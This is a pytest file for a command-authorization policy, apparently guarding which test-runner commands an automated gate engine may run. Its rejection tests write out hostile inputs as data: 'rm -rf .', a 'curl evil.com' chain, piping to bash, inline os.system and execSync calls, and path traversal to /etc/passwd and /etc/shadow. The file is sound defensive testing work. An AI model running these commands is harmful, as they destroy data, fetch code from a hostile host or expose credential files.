"""Tests for SafeCommandPolicy authorization layer."""

import pytest
from dafg.organism import SafeCommandPolicy, SecurityPolicyViolationError
from dafg.gates import Gate, GateEngine


def test_safe_command_policy_authorizes_valid_test_runners():
    SafeCommandPolicy.validate_command("uv run python test_system.py CORE")
    SafeCommandPolicy.validate_command("node test_system.js STORAGE")
    SafeCommandPolicy.validate_command("pytest")
    SafeCommandPolicy.validate_command("python -m pytest")
    SafeCommandPolicy.validate_command("uv run pytest tests/test_core.py")


def test_safe_command_policy_blocks_shell_injection_operators():
    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("uv run python test_system.py CORE; rm -rf .")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("uv run python test_system.py CORE && curl evil.com")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node test_system.js | bash")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node test_system.js $(whoami)")


def test_safe_command_policy_blocks_inline_code_flags():
    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node -e \"require('child_process').execSync('id')\"")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("python3 -c \"import os; os.system('id')\"")


def test_safe_command_policy_blocks_dynamic_execution_calls():
    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node test_system.js execSync")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("uv run python test_system.py os.system")


def test_gate_engine_enforces_safe_policy_when_configured():
    engine = GateEngine(auto_approve=True, enforce_safe_policy=True)
    bad_gate = Gate(
        id="G_BAD",
        title="Malicious Gate",
        check="node -e \"process.exit(0)\"",
        expect="ok",
    )
    res = engine.execute_gate(bad_gate)
    assert res.status == "FAILED"
    assert "Security violation" in res.error


def test_safe_command_policy_blocks_path_traversal_targets():
    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node test_system.js ../../../etc/passwd")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("python3 test_system.py ../../secret")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("uv run python test_system.py /etc/shadow")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node test_system.js test.js")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("python test_system.py sub/dir/test")


def test_safe_command_policy_blocks_pytest_traversal():
    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("pytest ../../../etc/passwd")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("uv run pytest /abs/path")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("python -m pytest ..\\windows\\path")


def test_safe_command_policy_blocks_prefix_confusion():
    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node test_system.js.bak")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("python test_system.py_malicious")

    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node test_system.jsx")


def test_safe_command_policy_blocks_null_bytes():
    with pytest.raises(SecurityPolicyViolationError):
        SafeCommandPolicy.validate_command("node test_system.js CORE\x00extra")


def test_safe_command_policy_authorizes_alphanumeric_targets():
    SafeCommandPolicy.validate_command("node test_system.js CORE")
    SafeCommandPolicy.validate_command("python3 test_system.py E2E")
    SafeCommandPolicy.validate_command("uv run python test_system.py STORAGE_PASS")
    SafeCommandPolicy.validate_command("uv run python test_system.py MODULE_1")

